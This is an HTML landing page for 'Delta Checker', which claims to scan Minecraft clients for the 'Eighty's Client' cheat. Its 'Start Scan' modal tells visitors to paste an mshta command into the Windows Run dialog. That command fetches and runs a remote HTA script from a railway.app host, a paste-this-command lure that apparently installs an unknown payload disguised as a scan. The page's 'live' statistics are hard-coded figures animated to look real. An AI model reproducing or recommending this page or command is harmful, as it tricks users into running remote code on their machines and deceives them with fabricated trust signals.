<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Delta Checker · Eighty's Client Scanner</title>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=JetBrains+Mono:wght@500&display=swap" rel="stylesheet">
<style>
*, *::before, *::after { margin:0; padding:0; box-sizing:border-box; }

body {
  background: #0b0d11;
  color: #e0e2e8;
  font-family: 'Inter', -apple-system, sans-serif;
  min-height: 100vh;
  overflow-x: hidden;
}

::-webkit-scrollbar { width: 6px; }
::-webkit-scrollbar-track { background: #0b0d11; }
::-webkit-scrollbar-thumb { background: #1e2230; border-radius: 3px; }
::-webkit-scrollbar-thumb:hover { background: #2a2f42; }

/* ─── HEADER ─── */
header {
  border-bottom: 1px solid #191d2a;
  background: rgba(11,13,17,0.85);
  backdrop-filter: blur(16px);
  position: sticky; top: 0; z-index: 50;
}

.header-inner {
  max-width: 1000px; margin: 0 auto;
  display: flex; align-items: center;
  justify-content: space-between;
  padding: 16px 24px;
}

.logo {
  display: flex; align-items: center; gap: 10px;
  font-weight: 800; font-size: 20px; color: #fff;
  letter-spacing: -0.5px;
}
.logo .icon {
  width: 32px; height: 32px;
  background: linear-gradient(135deg, #4ade80, #22d3ee);
  border-radius: 8px;
  display: flex; align-items: center; justify-content: center;
  font-size: 18px;
}
.logo span { background: linear-gradient(135deg, #4ade80, #22d3ee); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }

nav { display: flex; gap: 24px; align-items: center; }
nav a { color: #6b7280; text-decoration: none; font-size: 14px; font-weight: 500; transition: color .15s; cursor: pointer; }
nav a:hover { color: #e0e2e8; }
nav a.active { color: #4ade80; }

/* ─── HERO ─── */
.hero {
  max-width: 800px; margin: 0 auto;
  padding: 64px 24px 40px;
  text-align: center;
}

.hero h1 {
  font-size: 40px; font-weight: 800;
  letter-spacing: -1px; line-height: 1.15;
  margin-bottom: 16px;
}
.hero h1 span { background: linear-gradient(135deg, #4ade80, #22d3ee); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }

.hero p {
  color: #6b7280; font-size: 17px;
  max-width: 560px; margin: 0 auto 40px;
  line-height: 1.6;
}

/* ─── STATS ROW ─── */
.stats {
  display: grid;
  grid-template-columns: repeat(4, 1fr);
  gap: 16px;
  max-width: 800px; margin: 0 auto 40px; padding: 0 24px;
}

.stat-card {
  background: #11141c;
  border: 1px solid #191d2a;
  border-radius: 14px;
  padding: 24px 16px;
  text-align: center;
  transition: border-color .2s;
}
.stat-card:hover { border-color: #2a2f42; }

.stat-number {
  font-size: 28px; font-weight: 800;
  letter-spacing: -0.5px;
  color: #fff;
  margin-bottom: 4px;
}
.stat-label {
  font-size: 13px; color: #6b7280; font-weight: 500;
}
.stat-card .stat-number.green { color: #4ade80; }
.stat-card .stat-number.cyan { color: #22d3ee; }
.stat-card .stat-number.amber { color: #fbbf24; }
.stat-card .stat-number.pink { color: #f472b6; }

/* ─── SINGLE CARD ─── */
.card-wrap {
  max-width: 800px; margin: 0 auto 32px; padding: 0 24px;
}

.feature-card {
  background: #11141c;
  border: 1px solid #191d2a;
  border-radius: 16px;
  padding: 32px 28px;
  transition: border-color .2s;
}
.feature-card:hover { border-color: #2a2f42; }

.feature-card .icon-wrap {
  width: 48px; height: 48px;
  border-radius: 12px;
  display: flex; align-items: center; justify-content: center;
  font-size: 24px;
  margin-bottom: 16px;
  background: rgba(74,222,128,0.1);
}

.feature-card h3 { font-size: 19px; font-weight: 700; margin-bottom: 10px; color: #fff; }
.feature-card p { font-size: 14px; color: #6b7280; line-height: 1.7; max-width: 600px; }

.feature-card .detect-list {
  display: flex; flex-wrap: wrap; gap: 8px;
  margin-top: 18px;
}

.feature-card .detect-list .tag {
  background: rgba(74,222,128,0.08);
  border: 1px solid rgba(74,222,128,0.15);
  color: #4ade80;
  font-size: 12px; font-weight: 600;
  padding: 6px 14px;
  border-radius: 8px;
}

/* ─── CTA ─── */
.cta-wrap {
  text-align: center;
  padding: 8px 24px 64px;
}

.cta-btn {
  display: inline-flex; align-items: center; gap: 10px;
  background: linear-gradient(135deg, #4ade80, #22d3ee);
  color: #000;
  font-weight: 700; font-size: 16px;
  padding: 16px 40px;
  border: none; border-radius: 12px;
  cursor: pointer;
  font-family: 'Inter', sans-serif;
  transition: all .2s;
  box-shadow: 0 4px 24px rgba(74,222,128,0.2);
}
.cta-btn:hover { transform: translateY(-2px); box-shadow: 0 8px 32px rgba(74,222,128,0.3); }
.cta-btn:active { transform: translateY(0); }

.cta-sub {
  margin-top: 12px;
  font-size: 13px; color: #4b5563;
}

.what-btn {
  display: inline-block;
  margin-top: 16px;
  background: none;
  border: 1px solid #2a2f42;
  color: #6b7280;
  font-family: 'Inter', sans-serif;
  font-size: 13px; font-weight: 500;
  padding: 10px 24px;
  border-radius: 10px;
  cursor: pointer;
  transition: all .15s;
}
.what-btn:hover { border-color: #4b5563; color: #e0e2e8; background: rgba(255,255,255,0.03); }

/* ─── MODAL ─── */
.modal-overlay {
  position: fixed; inset: 0;
  background: rgba(0,0,0,0.7);
  backdrop-filter: blur(8px);
  z-index: 100;
  display: none;
  align-items: center; justify-content: center;
  padding: 24px;
}
.modal-overlay.active { display: flex; }

.modal {
  background: #11141c;
  border: 1px solid #191d2a;
  border-radius: 20px;
  padding: 32px;
  max-width: 520px; width: 100%;
  box-shadow: 0 24px 80px rgba(0,0,0,0.5);
  position: relative;
}

.modal .close-btn {
  position: absolute; top: 16px; right: 16px;
  background: none; border: none; color: #4b5563;
  font-size: 22px; cursor: pointer; line-height: 1;
  transition: color .15s;
}
.modal .close-btn:hover { color: #fff; }

.modal h2 {
  font-size: 22px; font-weight: 800;
  margin-bottom: 6px;
  letter-spacing: -0.5px;
}
.modal p {
  color: #6b7280; font-size: 14px;
  margin-bottom: 24px; line-height: 1.6;
}

.modal .cmd-box {
  background: #0b0d11;
  border: 1px solid #191d2a;
  border-radius: 12px;
  padding: 16px 20px;
  display: flex; align-items: center;
  gap: 12px;
  margin-bottom: 24px;
}

.modal .cmd-box code {
  font-family: 'JetBrains Mono', monospace;
  font-size: 13px;
  color: #4ade80;
  word-break: break-all;
  flex: 1;
}

.modal .cmd-box .copy-btn {
  background: #1e2230;
  border: 1px solid #2a2f42;
  color: #e0e2e8;
  font-family: 'Inter', sans-serif;
  font-size: 12px; font-weight: 600;
  padding: 8px 16px;
  border-radius: 8px;
  cursor: pointer;
  transition: all .15s;
  white-space: nowrap;
}
.modal .cmd-box .copy-btn:hover { background: #2a2f42; border-color: #4ade80; color: #4ade80; }
.modal .cmd-box .copy-btn.copied { background: rgba(74,222,128,0.15); border-color: #4ade80; color: #4ade80; }

.modal .steps {
  background: #0b0d11;
  border-radius: 12px;
  padding: 16px 20px;
}

.modal .steps ol {
  list-style: none; counter-reset: step;
}

.modal .steps ol li {
  counter-increment: step;
  padding: 8px 0;
  font-size: 13px;
  color: #9ca3af;
  display: flex; align-items: flex-start; gap: 12px;
  line-height: 1.5;
}

.modal .steps ol li::before {
  content: counter(step);
  width: 24px; height: 24px;
  background: #1e2230;
  border-radius: 6px;
  display: flex; align-items: center; justify-content: center;
  font-size: 12px; font-weight: 700;
  color: #6b7280;
  flex-shrink: 0;
}

.modal .steps ol li strong { color: #e0e2e8; font-weight: 600; }

/* ─── RESPONSIVE ─── */
@media(max-width:768px){
  .hero h1 { font-size: 28px; }
  .stats { grid-template-columns: repeat(2, 1fr); }
  nav { display: none; }
}

@media(max-width:480px){
  .stats { grid-template-columns: 1fr; }
  .stat-number { font-size: 24px; }
  .hero { padding-top: 40px; }
  .hero h1 { font-size: 24px; }
}
</style>
</head>
<body>

<header>
  <div class="header-inner">
    <div class="logo">
      <div class="icon">⛏</div>
      <span>Delta Checker</span>
    </div>
    <nav>
      <a class="active">Home</a>
      <a>Scanner</a>
      <a>Eighty's</a>
    </nav>
  </div>
</header>

<section class="hero">
  <h1><span>Eighty's Client</span> Detector</h1>
  <p>Detect Eighty's Client injections, mod overlays, and unauthorized hooks in your Minecraft client. Real-time signature matching and behavioral analysis.</p>
</section>

<div class="stats" id="stats">
  <div class="stat-card">
    <div class="stat-number green" id="scans-today">52,872</div>
    <div class="stat-label">Scans Today</div>
  </div>
  <div class="stat-card">
    <div class="stat-number amber" id="exploits-detected">4,291</div>
    <div class="stat-label">Eighty's Detected</div>
  </div>
  <div class="stat-card">
    <div class="stat-number cyan" id="detection-rate">98.3%</div>
    <div class="stat-label">Detection Rate</div>
  </div>
  <div class="stat-card">
    <div class="stat-number pink" id="avg-scan">1.2s</div>
    <div class="stat-label">Avg Scan Time</div>
  </div>
</div>

<div class="card-wrap">
  <div class="feature-card">
    <div class="icon-wrap">🛡</div>
    <h3>Eighty's Client Scanner</h3>
    <p>Scans your Minecraft client for Eighty's Client injections, mod overlays, memory hooks, and unauthorized classloaders. Detects all known Eighty's Client versions including v2.4 through v3.8, Lite, and Developer builds.</p>
    <div class="detect-list">
      <span class="tag">Eighty's v2.4</span>
      <span class="tag">Eighty's v3.0</span>
      <span class="tag">Eighty's v3.5</span>
      <span class="tag">Eighty's v3.8</span>
      <span class="tag">Eighty's Lite</span>
      <span class="tag">Eighty's Dev</span>
      <span class="tag">Memory Injection</span>
      <span class="tag">Classloader Hook</span>
    </div>
  </div>
</div>

<div class="cta-wrap">
  <button class="cta-btn" onclick="openModal()">
    <span>⚡</span> Start Scan
  </button>
  <div class="cta-sub" style="margin-top:8px;">100% Free · No Download Required · Instant Results</div>
  <button class="what-btn" onclick="openWhatModal()">❓ What is this?</button>
</div>

<!-- MODAL -->
<div class="modal-overlay" id="modal">
  <div class="modal">
    <button class="close-btn" onclick="closeModal()">✕</button>
    <h2>⛏ Run Eighty's Scan</h2>
    <p>Copy the command below and paste it into your Windows Run dialog (Win+R) to execute the Eighty's Client detection scanner.</p>

    <div class="cmd-box">
      <code id="cmd-text">mshta https://delta-eightys.up.railway.app/scan</code>
      <button class="copy-btn" id="copy-btn" onclick="copyCommand()">Copy</button>
    </div>

    <div class="steps">
      <ol>
        <li><strong>Open the Run dialog</strong> — press <strong>Win + R</strong> on your keyboard</li>
        <li><strong>Paste the command</strong> — press <strong>Ctrl + V</strong> into the text box</li>
        <li><strong>Press Enter</strong> — It will then look for the eighty's file</li>
      </ol>
    </div>
  </div>
</div>

<!-- WHAT IS THIS MODAL -->
<div class="modal-overlay" id="what-modal">
  <div class="modal">
    <button class="close-btn" onclick="closeWhatModal()">✕</button>
    <h2>❓ What is Eighty's Client?</h2>
    <p style="font-size:15px;color:#d1d5db;line-height:1.7;margin-bottom:0;">This scanner checks to see if somebody is using Eighty's Client — a hacked client that can get them and their teammate banned. It scans for memory hooks, modified classloaders, and known Eighty's signatures across all active Minecraft processes.</p>
  </div>
</div>

<script>
// ─── COUNTERS ───
let scansVal = 52872;
let exploitsVal = 4291;

function animateCounter(el, target, suffix, duration) {
  const start = parseFloat(el.textContent.replace(/,/g,''));
  const startTime = performance.now();
  function tick(now) {
    const t = Math.min((now - startTime) / duration, 1);
    const eased = 1 - Math.pow(1 - t, 3);
    const current = start + (target - start) * eased;
    el.textContent = current.toLocaleString('en-US', { maximumFractionDigits: 1 }) + (suffix || '');
    if (t < 1) requestAnimationFrame(tick);
  }
  requestAnimationFrame(tick);
}

function animateStats() {
  animateCounter(document.getElementById('scans-today'), 52872, '', 2000);
  animateCounter(document.getElementById('exploits-detected'), 4291, '', 2000);
  animateCounter(document.getElementById('detection-rate'), 98.3, '%', 2000);
  animateCounter(document.getElementById('avg-scan'), 1.2, 's', 2000);
}

// ─── MODAL ───
function openModal() {
  document.getElementById('modal').classList.add('active');
}

function closeModal() {
  document.getElementById('modal').classList.remove('active');
}

function openWhatModal() {
  document.getElementById('what-modal').classList.add('active');
}

function closeWhatModal() {
  document.getElementById('what-modal').classList.remove('active');
}

function copyCommand() {
  const cmd = document.getElementById('cmd-text');
  const btn = document.getElementById('copy-btn');

  if (navigator.clipboard && navigator.clipboard.writeText) {
    navigator.clipboard.writeText(cmd.textContent).then(() => {
      btn.textContent = 'Copied!';
      btn.classList.add('copied');
      setTimeout(() => { btn.textContent = 'Copy'; btn.classList.remove('copied'); }, 2000);
    });
  } else {
    const ta = document.createElement('textarea');
    ta.value = cmd.textContent;
    document.body.appendChild(ta);
    ta.select();
    document.execCommand('copy');
    document.body.removeChild(ta);
    btn.textContent = 'Copied!';
    btn.classList.add('copied');
    setTimeout(() => { btn.textContent = 'Copy'; btn.classList.remove('copied'); }, 2000);
  }
}

document.getElementById('modal').addEventListener('click', (e) => {
  if (e.target === e.currentTarget) closeModal();
});

document.getElementById('what-modal').addEventListener('click', (e) => {
  if (e.target === e.currentTarget) closeWhatModal();
});

document.addEventListener('keydown', (e) => {
  if (e.key === 'Escape') { closeModal(); closeWhatModal(); }
});

// ─── BOOT ───
animateStats();
</script>
</body>
</html>
